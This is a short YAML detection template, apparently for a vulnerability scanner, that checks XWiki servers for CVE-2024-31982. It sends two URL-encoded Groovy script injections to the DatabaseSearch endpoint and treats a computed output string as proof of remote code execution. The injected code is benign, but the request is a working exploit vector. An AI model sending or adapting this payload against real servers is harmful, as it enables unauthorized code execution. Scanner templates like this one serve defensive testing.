cve-id: CVE-2024-31982
rules:
- method: GET
  path: /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
  expression: 'response.body.bcontains(b"Hello from search text:42</title>") && response.body.bcontains(b"<title>RSS
    feed") && response.status ==  200 '
- method: GET
  path: /bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
  expression: 'response.body.bcontains(b"Hello from search text:42</title>") && response.body.bcontains(b"<title>RSS
    feed") && response.status ==  200 '
severity: critical
type: rce
